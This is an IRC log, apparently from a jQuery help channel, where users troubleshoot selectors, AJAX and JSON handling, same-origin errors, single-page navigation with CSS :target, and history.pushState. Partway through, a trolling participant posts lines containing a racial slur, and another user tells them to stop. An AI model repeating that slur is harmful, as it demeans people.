[11:47:08] <grafi> its strange that the hiding doesnt work when the slide animation is still in progress ...
[11:47:18] <grafi> that has to be some weird issue oô
[11:47:25] <zizzl> grafi, oh that's what hoverintent is for?
[11:47:37] <zizzl> it detects if you are actually really wanting to hover over that item?
[11:47:48] <BillCriswell> zizzl: Yeah, sets a small timeout.
[11:47:52] <grafi> exactly
[11:47:55] <zizzl> ahh thanks guys
[11:48:06] <zizzl> the rusty hammer way for now will be perfect though
[11:48:10] <grafi> makes your stuff look nicer
[11:48:13] <grafi> less flickery
[11:48:36] <grafi> hover intent is polishing, doesnt really have to do with my "solution"
[11:48:59] <grafi> you see when quickly mousing over the items how the animation start and creating the border or whatever
[11:49:21] <grafi> but if the hammer works for you, thats cool :P
[11:50:27] <PhaseCode> Evening, guys!
[11:50:33] <PhaseCode> Anyone a MySQL Wizard in here?
[11:50:45] <grafi> in #jQuery ?
[11:50:45] <grafi> oô
[11:50:53] <PhaseCode> I know ;;
[11:51:02] <PhaseCode> Is there a MySQL/SQL chat?
[11:51:08] <PhaseCode> maybe I should google that...
[11:51:11] <alexd> -> #mysql
[11:51:15] <grafi> #mysql
[11:51:20] <grafi> prollybab
[11:55:23] <Spami> For some reason my function "$('.edit_gallery').on('click', '.delete_image', function(e) {" is being fired 2 times with only only click
[11:58:13] <sportman> http://jsfiddle.net/jbotte89/46frx/14/
[11:58:20] <sportman> any reason why the hide won't animate?
[12:05:54] <bberry> is this a valid selector $('.inputclass > inupt[type="text"]')
[12:06:08] <bberry> bah s/inupt/input/
[12:06:59] <BillCriswell> bberry: Yeah it's cool.
[12:07:42] <LoneSoldier728> quick question, using ajax on javascript and not jquery does it accept json the same way
[12:07:43] <sdarby> So I have a fixed header, and when my window loads on the window.location.hash, a tab pane, the the fixed header covers up my tabs. Any one have any idea how to display the tabs?
[12:07:49] <LoneSoldier728> jquery does it u set its datatype
[12:08:00] <BillCriswell> sportman: http://jsfiddle.net/46frx/15/
[12:08:08] <BillCriswell> Think it was just your specificity confusing shit.
[12:08:18] <jedimind> i love the word specificity
[12:08:24] <jedimind> sometimes i sit and mutter it out loud w/ my headphones on while i code
[12:08:27] <jedimind> repeatedly
[12:08:28] <sportman> lolol
[12:08:31] <jedimind> people think im weird
[12:08:38] <sportman> so it was just because i used !important?
[12:08:48] <jedimind> never use !important
[12:08:54] <Jabberwock> EVER
[12:08:54] <jedimind> unless you absolutely must and know what it means
[12:08:57] <LoneSoldier728> I also, was wondering in an ajax response, do u get the specific fields in a object by stating getResponseHeader('age')
[12:09:03] <sportman> heh alrighty
[12:09:10] <sportman> thanks BillCriswell
[12:09:13] <BillCriswell> sportman: I changed some ids to classes and that seemed to work?
[12:09:15] <jedimind> its a serious commitment not all people are ready for
[12:09:17] <BillCriswell> sportman: No problem.
[12:09:24] <Jabberwock> LoneSoldier728: You're sending data back via headers?
[12:09:31] <Jabberwock> That's odd.
[12:09:53] <Jabberwock> Are you sure you're not getting a JSON response back?
[12:11:45] <LoneSoldier728> oh
[12:11:46] <LoneSoldier728> um
[12:11:58] <LoneSoldier728> well lets say the server is sending a response back in json
[12:12:06] <LoneSoldier728> how would i get the info then
[12:12:25] <LoneSoldier728> i am trying to figure out the pure javascript way just to understand it better
[12:13:16] <sportman> BillCriswell: is there a reason it shouldn't have worked as an id over a class?
[12:13:26] <jedimind> less specificity
[12:13:32] <jedimind> spe ci fi ci ty
[12:13:34] <jedimind> specificity
[12:13:38] <jedimind> mmm delicious
[12:13:48] <sportman> yea, but i mean did i break some rule by being too specific?
[12:14:29] <sportman> i just thought ids were fine if you were to only have them occur once on a page
[12:14:37] <bberry> BillCriswell: it's kind of ugly, but how about this? $('.loggerinputs tr td:nth-child(2) > input[type="text"]')
[12:14:57] <BillCriswell> bberry: That looks fine as we..
[12:15:05] <BillCriswell> fine as well*
[12:15:06] <jedimind> sportman i honestly have no idea what the problem was or is
[12:15:08] <jedimind> i havent looked ait
[12:15:12] <jedimind> i just like saying that word
[12:15:14] <jedimind> specificity
[12:15:22] <sportman> =p
[12:15:22] <jedimind> its like a party on my tounge
[12:15:40] <bberry> BillCriswell: Sweet, thanks for the help :D
[12:15:56] <BillCriswell> Welcome.
[12:16:05] <LoneSoldier728> anyone have good ajax knowledge
[12:16:07] <bberry> ive used simple selectors, not much past that >.<
[12:16:17] <bberry> !ask
[12:16:17] <b-ot> bberry: If you have a question, please just ask it. Don't look for topic experts. Don't ask to ask. Don't PM! Don't ask if people are awake, or in the mood to help. Just ask the question straight out. http://catb.org/~esr/faqs/smart-questions.html
[12:16:26] <LoneSoldier728> i actually have an interview in 15 min and want to just understand it lol :)
[12:16:35] <bberry> ah
[12:17:03] <bberry> !mdn ajax getting started
[12:17:04] <b-ot> bberry: Getting Started - AJAX | MDN - Mozilla Developer Center → https://developer.mozilla.org/en-US/docs/AJAX/Getting_Started
[12:17:08] <bberry> you could try that
[12:18:34] <LoneSoldier728> but that only shows
[12:18:36] <LoneSoldier728> xml
[12:18:42] <LoneSoldier728> i was wondering how json worked
[12:19:30] <LoneSoldier728> because json is just key: value
[12:19:32] <LoneSoldier728> not tags
[12:20:14] <LoneSoldier728> ah just JSON.parse it?
[12:22:31] <Ericx2x> Can someone take a look at the buttons on this slideshow and tell me how I can change them to be images instead? http://adapt2.erictheprogrammer.com
[12:24:19] <bberry> LoneSoldier728: Yep.
[12:25:06] <bberry> Has anyone here done JSON POST in jquery?
[12:25:29] <LoneSoldier728> and then can I just call the fields by simply
[12:25:35] <LoneSoldier728> responseText.fieldName?
[12:25:49] <LoneSoldier728> to get the value of just one field out of the many field object or?
[12:27:29] <bberry> LoneSoldier728: Is this specific to jquery or general javascript? (not asking to change channels or anything, but the $.ajax is different than manually setting up a javascript xhr)

[13:28:25] <petey> I've got a basic list of tabs, you click the link, a tab pops up. I know e.preventdefault() stops it from opening up the actually link, I would like one of these menu items to be an actual link to go to a different page
[13:28:28] <petey> Is there a specific name for this?
[13:28:52] <petey> What would I be searching for, to prevent e.preventDefault() and to actually go through with clicking through?
[13:29:32] <myosotis> you wrote the code that calls preventDefault()?
[13:30:19] <myosotis> test for whatever condition the link needs to match in order to open up the url... if it's one specific case, you can just compare the value of the href with the really-open-link url
[13:30:36] <tra_> petey: add a class "follow" and check for that in the handler
[13:30:36] <myosotis> if it's multiple cases, maybe you could add a data attribute or class to the links and test them
[13:30:43] <petey> hold on ill put it on jsfiddle
[13:32:07] <dgrubelic> http://pastebin.com/bSre7pBj
[13:32:33] <dgrubelic> self inside success handler is global object
[13:36:23] <petey> for some reason it's working here.. hmm
[13:36:23] <petey> http://jsfiddle.net/GXZtv/
[13:36:52] <petey> http://jsfiddle.net/GXZtv/1/
[13:37:10] <petey> clicking tab-1,tab-2,tab-3 opens up the tab, clicking tab-0 should take you to the next page
[13:37:34] <petey> in my project, clicking tab-0 doesn't work UNTIL you click on any other tab
[13:37:50] <petey> does anyone mind looking this over?
[13:51:46] <lasha> you never did e.preventDefault()
[13:51:47] <lasha> http://jsfiddle.net/GXZtv/4/
[13:51:57] <lasha> tab 1 2 and 3 both had href="#"
[13:52:00] <lasha> so it never took you anywhere
[13:52:10] <lasha> whereas the 1st link actually tried to load a page
[13:52:17] <lasha> tab-0 tried to load a link, rather
[13:52:29] <lasha> so i added e.preventDefault()
[13:52:37] <lasha> to stop the default click action from happening
[13:52:48] <lasha> so now your code works
[13:53:18] <Bloomberg> guys!!
[13:53:24] <Bloomberg> Someone has worked with fancybox?
[13:53:32] <lasha> yea what a bout it
[13:53:32] <talntid> !ask
[13:53:32] <b-ot> talntid: If you have a question, please just ask it. Don't look for topic experts. Don't ask to ask. Don't PM! Don't ask if people are awake, or in the mood to help. Just ask the question straight out. http://catb.org/~esr/faqs/smart-questions.html
[13:55:09] <clime> hey anyone could help with an issue with plugin caroufredsel?
[13:55:51] <Bloomberg> I don't know why the window doesn't resize automatically when it change the content
[13:57:02] <Bloomberg> Why?
[14:00:03] <duch_kazatel> because the window's size didn't change.
[14:00:05] <duch_kazatel> the content did.
[14:00:32] <Bloomberg> duch_kazatel : and if the content is more big than the before?
[14:06:52] <lasha> Bloomberg: which fancybox version you using?
[14:06:54] <lasha> version 2?
[14:08:41] <lasha> fancybox has an API method
[14:08:42] <lasha> $.fancybox.update()
[14:09:04] <lasha> so when you need to "refresh" it, you call that
[14:09:11] <sayd> im having trouble understanding deferreds.. i want to basically return a potentially cached value http://jsfiddle.net/PvYzT/
[14:09:34] <Bloomberg> 2.1.4
[14:09:47] <lasha> Bloomberg: what i said applies to you.
[14:12:29] <lasha> sorry sayd, i haven't worked directly with deferreds like that
[14:12:55] <lasha> i don't see why you can't use the native behavior
[14:13:02] <lasha> of .getJSON()
[14:13:12] <lasha> or .ajax()
[14:14:18] <gandalfcome> I'm currently playing around with query (I'm a python programmer and not very experienced with script). I want my webpage to load different content according to the url. So for www.example.com/index.html#contenta - I wrote $("#contenta").load("test.txt") - this doesn't seem to do anything. what am I doing wrong.
[14:15:45] <lasha> sayd: read this http://danieldemmel.me/blog/2013/03/22/an-introduction-to-jquery-deferred-slash-promise/
[14:16:04] <lasha> gandalfcome: is it throwing an error or anythign in the console?
[14:16:14] <lasha> gandalfcome: is it throwing an error or anythign in the console?
[14:16:44] <gandalfcome> @lasha: nope. I also put a var x =1; beforehand and I can type x in the console and get 1
[14:17:12] <gandalfcome> I did now var test = $("#contenta").load("test.txt"); -> test = [] in the console
[14:18:00] <gandalfcome> @lasha http://pastebin.com/7aUKnwYW
[14:18:36] <sayd> lasha: here is an updated example http://jsfiddle.net/PvYzT/1/
[14:18:43] <sayd> i am seeing [undefined] logged out
[14:19:28] <lasha> gandalfcome: where is "#mcsnr" in your html?
[14:19:55] <gandalfcome> @lasha oh no its not. I'm just giving the url index.html#mcsnr
[14:20:56] <Atlantic777> After $.mobile.loadPage, do I need to do something after that to actually show that new page?
[14:21:04] <Atlantic777> It's loaded into DOM, but nothing happens.
[14:21:08] <gandalfcome> @lasha I have a navbar and other static items on my website (very simple website) and according to what navbar item is pressed I want to load different content. jquery seems to be a way forward.
[14:21:55] <lasha> did you try making that .txt file a .html?
[14:23:11] <gandalfcome> yep done.
[14:24:25] <gandalfcome> @lasha - I just realize that I might have misunderstood these $("#home") does not refer to index.html#home but to an id="home".
[14:25:21] <duch_kazatel> gandalfcome yeah.
[14:25:37] <duch_kazatel> gandalfcome are you familiar with CSS selectors?
[14:26:38] <gandalfcome> dutch_kazatel: I heard about them just now for the first time. When I made my last homepage, html frames were the newest technology available ;-)
[14:27:04] <duch_kazatel> gandalfcome hah fair enough. you'll get the hang of the newest stuff pretty quick.
[14:27:11] <duch_kazatel> CSS is good stuff.
[14:29:08] <gandalfcome> duch_kazatel: not doubting that - http://pastebin.com/VaVDDE9p. so here is the webpage.
[14:29:45] <gandalfcome> duch_kazatel 71-74 is the selector test
[14:30:16] <gandalfcome> duch_kazatel: 48 the id is defined.
[14:30:37] <duch_kazatel> <li><a href="#mcsnr" id="mcsnr">Magellanic Cloud Supernova Companion Search</a></li>
[14:30:38] <duch_kazatel> that guy?
[14:31:24] <gandalfcome> yep.
[14:31:58] <duch_kazatel> $("#home").click(function() { should then be $("#mcsnr").click(function() {
[14:32:31] <gandalfcome> duch_kazatel: sorry - you're right - I f**ed this up.
[14:33:25] <duch_kazatel> it's nbd mano.
[14:33:41] <duch_kazatel> go check out CSS selectors - that'll be a mountain of help.
[14:35:08] <gandalfcome> duch_kazatel: So I'm just trying to build a little personal homepage. I'm using bootstrap with navbars and do not want to have 5 different pages where I always specify the navbar with the different content. Is that the right way of doing it?
[14:38:11] <duch_kazatel> gandalfcome are you using any sort of server-side programming language?
[14:38:43] <duch_kazatel> or do you have server-side includes available?
[14:38:56] <gandalfcome> I was trying to avoid it - my personal webpage will probably move between different universities that might not have these enabled for personal pages.
[14:39:01] <duch_kazatel> because I assume what you want is to not have to copypaste your HTML top a bunch of different places.
[14:39:54] <duch_kazatel> i mean, you could build a single-page site like that.
[14:39:58] <duch_kazatel> using hashes.
[14:40:05] <duch_kazatel> that's a totally viable idea.
[14:41:15] <zizzl> BillCriswell or grafi you here?
[14:42:27] <gandalfcome> duch_kazatel: as long as people that know about web stuff think it's not extremely stupid, then I think I'll go with that. it still doesn't work, btw.
[14:42:46] <Corey> Okay, which of you nutters has a JQUERY license plate from Washington State and is in Los Angeles this week? :-)
[14:43:21] <Corey> My stupid chihuahua prefers MooTools and thus growled at it.
[14:44:22] <gandalfcome> duch_kazatel: http://pastebin.com/B4cKKiQS
[14:48:01] <duch_kazatel> gandalfcome sorry, i'm not going to download the whole thing and fire it up, etc.  have you heard about jsfiddle?
[14:48:18] <duch_kazatel> i'd suggest paring the issue down as much as possible and putting up a fiddle.
[14:48:24] <duch_kazatel> getting just the necessary pieces together.
[14:48:50] <gandalfcome> duch_kazatel: I have now ;-) thanks for your help - very much appreciated
[14:51:30] <shoky> zizzl: you can ask your question even if they're not here right now ;p
[15:00:02] <gandalfcome> @duch_kazatel: http://jsfiddle.net/FBYFG/ - if you could have a look.
[15:02:03] <defaultro> hey folks, what's the plugin called…we page down a webpage and it keeps getting bigger
[15:02:16] <defaultro> it will keep on pulling updates and put to the bottom
[15:04:11] <zakj> gandalfcome: your script appears (and runs) before the element is created in the DOM, so $('#mcsnr') returns an empty array. two solutions: move the script tag to just before the closing </body>, or wrap the contents of the script tag in $(function () { ... }), which is a jQuery shortcut to run the given function once the DOM is completely ready
[15:06:02] <gandalfcome> zakj: that worked thanks.
[15:06:20] <zakj> :)
[15:07:08] <zakj> thanks for the simplified problem example, those make diagnosis so much easier
[15:13:05] <gandalfcome> zakj: http://jsfiddle.net/FBYFG/ - now I want to load stuff. that doesn't seem to work.
[15:13:55] <zakj> gandalfcome: hmm, wrong URL? that looks like the old content
[15:14:21] <gandalfcome> zakj: ://jsfiddle.net/FBYFG/1/
[15:14:28] <gandalfcome> zakj: sorry
[15:14:37] <zakj> no worries!
[15:15:47] <Mattx> Hello
[15:15:59] <Mattx> I'm doing this: $('html,body').annimate({scrollTop: $('#annotations').offset().top-100}, 500)
[15:16:07] <Mattx> but it's not working, nor throwing an error
[15:16:11] <Mattx> what could be wrong?
[15:16:18] <Mattx>  $('#annotations').offset().top == 1000 or so
[15:16:20] <taylor_> animate*
[15:16:44] <Mattx> no no, I wrote it wrong here but it says animate
[15:17:26] <zakj> gandalfcome: http://jsfiddle.net/FBYFG/2/ (though note that it won't work on jsfiddle, due to the same-origin policy)
[15:17:33] <taylor_> what exactly are you trying to do? Mattx
[15:17:40] <Mattx> $('html,body').animate({scrollTop: 900}, 500)
[15:17:51] <gnarf> Mattx why not just body?
[15:17:56] <Mattx> taylor_, I'm trying to scroll to #annotations
[15:18:06] <Mattx> gnarf, I tried everything, even with document u.u
[15:19:20] <Mattx> any idea?
[15:19:27] <taylor_> Mattx: hmm
[15:19:40] <taylor_> try '900px' instead of 900, etc
[15:19:54] <duch_kazatel> $(document).scrollTop($('yourDiv').offset().top)
[15:19:59] <duch_kazatel> animate as appropriate.
[15:20:39] <Mattx> it doesn't here
[15:20:49] <Mattx> it's weird
[15:21:00] <gnarf> Mattx: http://jsbin.com/OYAjaxe/1/edit?js,output
[15:21:30] <gnarf> Mattx: please break it appropriately
[15:21:35] <duch_kazatel> and you're targeting $(document)?
[15:21:38] <Mattx> yeah, it works in jsbin
[15:22:03] <gnarf> Mattx: http://jsbin.com/OYAjaxe/1/watch?js,output
[15:22:16] <Mattx> there must be something wrong somewhere else but I can't figure out what
[15:22:32] <gandalfcome> @zakj: exactly what I want!! so now the last question is. How do I make it that when the page loads, it automatically loads the home.html content, but also when the href with id home is clicked. I'm a pythoneer here's what I mean: if page_loaded_for_first_time or css_selectetor_home_clicked: content.load('home.html') (as an example for pseudo code)
[15:22:48] <gnarf> Mattx: so start adding things to the jsbin that are on your site until it breaks
[15:22:50] <gnarf> then you know
[15:22:58] <gnarf> also what version of jquery?
[15:23:08] <Mattx> hmn, rails' version, not sure
[15:23:10] <Mattx> let me check
[15:23:31] <Mattx> v1.10.2
[15:24:39] <zakj> gandalfcome: I think I follow you... how about you write a function that loads the home content, then on page load both bind it to a click on the appropriate element, and call it immediately
[15:26:18] <gnarf> gandalfcome sound terrible for search engines
[15:27:48] <gnarf> gandalfcome: also browser history will suck
[15:28:18] <abjorn> :o
[15:30:08] <gnarf> gandalfcome: if you wanted to do some task in response to something being clicked AND the document first loading -- function doSomeTask() { … } $(function() { doSomeTask(); $("#button").click(doSomeTask); });
[15:30:22] <gnarf> jQuery(function); is a shortcut for "call when document is parsed and ready"
[15:30:34] <gnarf> `api jQuery()
[15:30:35] <b-ot> gnarf: No matches.
[15:30:41] <gnarf> `api jQuery
[15:30:41] <b-ot> gnarf: jQuery(): Accepts a string containing a CSS selector which is then used to match a set of elements. http://api.jquery.com/jQuery/
[15:30:41] <gandalfcome> @gnarf: so here's the deal - it's just a personal webpage that has a couple of different pages for projects. each of these pages has the same navbar and sidebar. After googling for a long time jquery.load with css selectors and appropriate IDs in the navbar seemed a good solution. Modern web design is very much removed from my core field, so better ideas (they need to be simple as well ;-) ) are welcome. It seems a lot of tutorials do
[15:30:42] <gandalfcome>  href=#home, href='#about', but I can't figure out how to use them.
[15:32:25] <gandalfcome> @gnarf: I guess that is very similar to what zakj was suggesting?
[15:32:35] <gnarf> gandalfcome: so here's the deal - I'm just a jQuery developer who does this every day… Using <div id="home-content">…</div> <a href="#home-content">home</a>
[15:32:50] <gnarf> gandalfcome take a look at ui tabs maybe
[15:32:56] <gnarf> or even just do it yourself
[15:33:22] <gnarf> css3 has a http://www.w3schools.com/cssref/sel_target.asp
[15:33:31] <xtrm> hi
[15:33:41] <gnarf> and forgive the w3fools link
[15:33:45] <gnarf> google juice is silly there
[15:33:58] <gnarf> http://css-tricks.com/on-target/ --
[15:34:02] <zakj> gandalfcome: are you just trying to avoid copy/pasting your navbar and sidebar across projects? if you're a pythonista, you should consider a static site generator (hyde, pelican, frozen-flask, etc.)
[15:34:16] <xtrm> Im trying to set a textbox with jquery, but seems I can only find the textbox with the absolute long path: #dialog-edit.ui-dialog-content form#formEdit.p10 table.data tbody tr.even td input#stextbox
[15:34:26] <xtrm> can I short it someway like this:  $(".dialog-edit stextbox").attr("value", "some value");
[15:35:43] <gandalfcome> zakj: yep, that's exactly right. I was wondering about static site generators this afternoon. However, I have already invested a little bit into the jquery direction and am learning something new;-)
[15:35:48] <taylor_> xtrm: you should be able to target it with $("#stextbox")
[15:36:29] <zakj> gandalfcome: ah, nothing beats learning by doing. carry on ;)
[15:36:35] <gandalfcome> gnarf: it's that easy? so I put <div id="home-content"> together with <div id="about-content">
[15:36:39] <xtrm> yes taylor, the problem is that I have two forms with that textbox, and its setting only the other onw
[15:36:42] <xtrm> e
[15:37:04] <gnarf> gandalfcome - one page has all of the pages
[15:37:09] <dismist> once you get yo money right airythang else fall into place
[15:37:09] <xtrm> thats why I would like to specify the div above it
[15:37:10] <gandalfcome> gnarf: that means no jquery, right?
[15:37:11] <gnarf> its whats after the # that is shown
[15:37:27] <gnarf> gandalfcome: there are ways to do it without, you can go the single page route
[15:37:45] <dismist> how u gonna instruct this nigga to outmuscle the hussle without validatin his pedigree?
[15:37:51] <gnarf> but i wouldn't suggest ajax navigation model as a long term solution ;)
[15:38:03] <taylor_> yea, so you would use $(".dialog-edit #stextbox")
[15:38:10] <gnarf> if you want to make a page that doesn't switch pages when you switch pages - do that ;)
[15:38:13] <gnarf> just make one page
[15:38:14] <gandalfcome> gnarf: will the browser load the whole content in the beginning? (sorry these are stupid questions)
[15:38:22] <gnarf> of course
[15:38:25] <xtrm> _taylor ty goona test it :)
[15:38:30] <gnarf> you can set the display to none
[15:38:36] <gnarf> but it is still parsed
[15:38:45] <gnarf> it's doubtful you have so much html this would be slow
[15:38:45] <dismist> parse deeez, nigga
[15:38:58] <taylor_> xtrm: don't forget the # for id's and the . for classes when addressing stuff, otherwise it wont work
[15:39:09] <taylor_> xtrm: works the same as css
[15:39:15] <gnarf> dismist: knock it off please
[15:39:28] <gandalfcome> gnarf well images - I guess. anyways, let me try that out. thanks!
[15:39:37] <gandalfcome> zakj: thanks for your help as well.
[15:39:41] <n1mda> $.get("http:/someurl.com", function(data) {}); is not working. I try to alert() inside the function, but it doesnt display
[15:39:45] <n1mda> why?
[15:40:35] <gnarf> n1mda first of all - console.log is better --- secondly, are there any clues in your browsers developer console network tab?
[15:41:41] <n1mda> nope, no clues
[15:41:44] <n1mda> no errors
[15:41:49] <JFranks> Hmmm.. what would I use to target all <td> elements with class = "optional" and title = "temporary" ?
[15:42:01] <dismist> yo nine
[15:42:47] <gandalfcome> gnarf: so here's what I got from your suggestion: http://jsfiddle.net/FBYFG/3/ - I probably grossly misinterpreted you.
[15:43:19] <JFranks> td.optional[title="temporary"]  ?
[15:44:52] <gnarf> gandalfcome http://jsfiddle.net/FBYFG/4/
[15:45:48] <xtrm> _taylor it worked ty so much :) (was desesperated how to do it hehe)
[15:46:02] <gnarf> gandalfcome without jquery: http://jsfiddle.net/FBYFG/5/
[15:46:47] <gnarf> `caniuse :target
[15:46:48] <b-ot> gnarf: Sorry, I can't find anything on :target
[15:47:04] <n1mda> gnarf: ok, the console says: "Origin http://myhost.com is not allowed by Access-Control-Allow-Origin."
[15:47:24] <gnarf> gandalfcome: http://caniuse.com/#feat=css-sel3
[15:47:54] <gnarf> n1mda: so you can't just ajax an arbitrary url - its a security thing - the url must be on the same "origin" as the requesting page to use ajax
[15:48:29] <n1mda> and this is a fix that I can do? or does the third party server I'm contacting need to fix it?
[15:48:52] <gnarf> your web site can't reach out and call another website
[15:48:55] <gnarf> `sop
[15:48:56] <b-ot> gnarf: Requests must respect the Same Origin Policy ( http://en.wikipedia.org/wiki/Same_origin_policy ). Requesting cross-domain content in javascript is generally prohibited. Seeing OPTIONS requests? See https://developer.mozilla.org/en/HTTP_access_control
[15:49:13] <n1mda> ffs, ok
[15:49:31] <gnarf> as a user of the web, you are glad this is here
[15:49:42] <gandalfcome> @gnarf: so basically all browsers that matter - sorry, but the only difference between is that you clicked frameworks and extensions no-library or jquery. no difference in code, right?
[15:49:53] <gnarf> gandalfcome yeah
[15:50:00] <gnarf> gandalfcome just proving it doesn't need jquery :)
[15:50:20] <gnarf> `mdn location.replace @gandalfcome
[15:50:21] <b-ot> gandalfcome: Sorry, no results for ‟developer.mozilla.org location.replace @gandalfcome”.
[15:50:34] <gnarf> `mdn location.replace
[15:50:35] <b-ot> gnarf: Location.replace() - Mozilla Developer Center → https://developer.mozilla.org/en-US/docs/Web/API/Location.replace
[15:51:43] <gandalfcome> gnarf, so you're basically making sure that the history of the user is not filled with clicking around on the webpage - right?
[15:52:06] <gandalfcome> gnarf, if I want to load the content from different html files, I need jquery's load, right?
[15:52:27] <gnarf> gandalfcome - no - the only line of code there is saying "if we aren't pointing at anything, navigate to #about automatically"
[15:52:47] <gnarf> gandalfcome yeah - though I would not suggest adding ajax if you don't need it
[15:53:08] <gnarf> the whole point of using hidden divs like this is not using ajax
[15:53:41] <gnarf> if you are trying to load dynamic content this way, stick to the ajax
[15:53:49] <gandalfcome> gnarf: why would one not use ajax?
[15:53:57] <taylor_> xtrm: you're welcome :)
[15:54:21] <gandalfcome> gnarf: too complex? too slow?
[15:54:33] <gnarf> gandalfcome: if it's just a single information type page, you can just do it in a single html file
[15:54:43] <gnarf> couple of tabs, etc
[15:54:46] <gnarf> just put them all in one
[15:54:52] <gnarf> only one network request
[15:55:32] <gnarf> other reasons
[15:55:32] <gnarf> ajax is just not a "easy" thing to wrap the head around for most people
[15:55:58] <gnarf> considering its likely to be the first real introduction to what "asynchronus" means in javascript
[15:56:20] <gnarf> i'd suggest just looking for "ajax navigation" tutorial
[15:56:51] <gnarf> and avoiding w3schools :)
[15:57:00] <gandalfcome> gnarf, I see. for now I'll do it without ajax, but an introduction to jquery was fun.
[15:57:16] <gandalfcome> gnarf, why do I need class=panel?
[15:57:36] <gnarf> well if you want, use <section>'s instead of divs
[15:57:45] <gnarf> look at the css
[15:57:52] <gnarf> the panel class applies display: none
[15:58:05] <gnarf> whereas .panel:target applies display:block;
[15:58:27] <gnarf> so when the page is on #about, the #about.panel is showing but all other .panel are not
[16:00:28] <gandalfcome> gnarf, so one final question for now: I'm trying to find out what display can be set to for panel. Is there a documentation (google didn't seem to find something immediately useful with css 3 panel. thanks again for your help.
[16:01:09] <gnarf> gandalfcome - its just display… none, block, inline, inline-block, table-cell, etc...
[16:01:34] <gandalfcome> gnarf, thanks!
[16:01:36] <gnarf> gandalfcome: "panel" was just an arbitrary class name, could just as easily be "content-area" if you wanted it to be
[16:02:05] <gandalfcome> gnarf, so you can just make-up class names? and then access them in css?
[16:02:31] <gnarf> thats the whole point/only purpose of classes, yes
[16:03:39] <gandalfcome> gnarf, I guess they're somewhat different from what I use in python as classes.
[16:10:45] <gnarf> they are definitely not object oriented programming "classes" - but are kind of similar
[16:11:06] <gnarf> the css can decorate "classes" of elements very easily
[16:13:06] <gandalfcome> gnarf, so things work now. one thing is that my bootstrap navbar does not highlight the currently clicked value (http://pastebin.com/TEr0r5LB), maybe you know how to easily fix that.
[16:39:20] <bnovc> are there any standard ways that people modify URLs to make JS state copyable to others? http://www.asual.com/jquery/address/samples/ seemed to do this
[16:44:45] <doug65536> bnovc: to others?
[16:44:56] <LoneSoldier728> hey anyone here us backbone?
[16:45:04] <LoneSoldier728> how do u manipulate the data
[16:45:07] <LoneSoldier728> after .fetch()
[16:45:49] <bnovc> doug65536: that part could be ommitted and my sentence would mean the same thing. I want to set variables that save in the URL easily
[16:47:32] <doug65536> bnovc: if you mean for bookmarking, using location.hash works even in old browsers. history.pushState requires newer browsers but provides more ability to modify the url without reload
[16:48:07] <bnovc> I'm thinking that 'Address' that I linked uses pushState; that allows you to change URLs without just putting it after the '#', right?
[16:48:50] <doug65536> right, it puts an entry in the history (back/forward) list without reload
[16:49:47] <bnovc> it would be really handy if there were a wrapper for that (maybe 'Address' does this all) where you can just save/set values and it puts in the normal GET request format (?foo=bar&..)
[16:50:41] <doug65536> bnovc: that will get sent to the server if the user bookmarks that and uses it later. hashes won't get sent to the server. not sure whether that matters for you
[16:50:52] <bnovc> ya, I'd like it sent to the server
[16:52:45] <doug65536> ok well if you do end up using pushState directly, note that you don't "push" where you are, you push where you're going.
[16:53:15] <bnovc> oh
[16:53:18] <bnovc> that's obnoxious
[16:54:43] <doug65536> yeah, it's a bit counterintuitive. also, on page initialization, you probably want to use history.replaceState to initialize the state object for the main page
[16:55:04] <doug65536> some browsers fire a popstate event immediately, so there you'd need to handle a missing state object
[16:55:19] <doug65536> by ignoring it if the state is null
[16:56:17] <bnovc> I guess this is all kind of why I was asking if there's any nice wrapper for this
[16:56:25] <bnovc> I feel like what I'm trying to do is pretty straight-forward
[16:56:42] <bnovc> another one is to redirect anyone setting values with a hash, but that's pretty gross
[16:56:57] <doug65536> there's no redirect if you set the hash
[16:57:00] <doug65536> the page doesn't reload
[16:57:33] <doug65536> ah, you need to send it to the server... so you would have to translate it to a query string and location.replace
[16:58:15] <doug65536> bnovc: you don't need to model any back/forward navigation?
[16:58:54] <doug65536> bnovc: if back/forward won't behave like "normal" simply using history.replaceState is all you need and a lot of complexity disappears
[16:59:42] <doug65536> bnovc: replaceState just updates the url and avoids putting entries into the history
[17:02:00] <bnovc> doug65536: that's probably sufficient
[17:02:06] <bnovc> back/forward is nice but less needed
[17:04:54] <doug65536> bnovc: example http://jsfiddle.net/doug65536/p8sGJ/    use http://jsfiddle.net/doug65536/p8sGJ/show to see the address bar properly
[17:06:10] <doug65536> bnovc: you can get back that "someData" object by accessing history.state
[17:07:18] <doug65536> bnovc: I can't suggest any history plugins, I've always done that by hand
[17:14:47] <bnovc> doug65536: thanks
[17:40:46] <MrPunkin> I'm trying to get to the root of bad .on() performance. I've tried both attaching directly to the individual element as well as to a parent with selectors passed to .on(). Any idea why it would be slow?
[17:41:06] <MrPunkin> I have the same function / handler tied to another .on() event for a different set of elements that behaves exactly as expected
[17:42:54] <razzbee> can I use jquery UI and Bootstrap without any problem?

[17:51:49] <LoneSoldier728> hey so anyone XMLHttpRequest cannot load  Cross origin requests are only supported for HTTP.
[17:51:55] <LoneSoldier728> ever deal with that
[17:52:05] <LoneSoldier728> I am trying to run it locally the file
[17:52:22] <LoneSoldier728> I do not have a server to put it on to test it
[17:52:41] <LoneSoldier728> is there a way around that

[18:04:59] <LoneSoldier728> code?
[18:05:03] <LoneSoldier728> show us
[18:05:14] <LoneSoldier728> if u have it returning false
[18:05:21] <LoneSoldier728> if the form does not validate
[18:05:28] <LoneSoldier728> then it should not
[18:07:51] <ermadd> Prepping in jsfiddle
[18:08:07] <ermadd> http://jsfiddle.net/nUXBv/
[18:08:28] <ermadd> not pretty but you can see the jquery script i wanted to run
[18:09:25] <LoneSoldier728> um have an onclick event inside your submit button
[18:09:35] <LoneSoldier728> and have onclick="validate()"
[18:09:42] <LoneSoldier728> this way that function gets ran
[18:09:48] <LoneSoldier728> and then if it returns false it wont submit
[18:10:04] <ermadd> it actually gets ran currently but I'm not sure if it can be sent too soon
[18:10:44] <LoneSoldier728> ya I dont think u should have a problem this way, but i think there can be a timing issue
[18:10:44] <ermadd> I was getting reports that every once in a while someone gets directed to the processing page instead of AJAX handling it. so i wondered
[18:11:01] <LoneSoldier728> so to be safe
[18:11:06] <ermadd> agreed
[18:11:07] <LoneSoldier728> I would put it in the submit button
[18:11:13] <LoneSoldier728> this way 100%
[18:11:13] <ermadd> gracias
[18:11:16] <LoneSoldier728> gets ran before

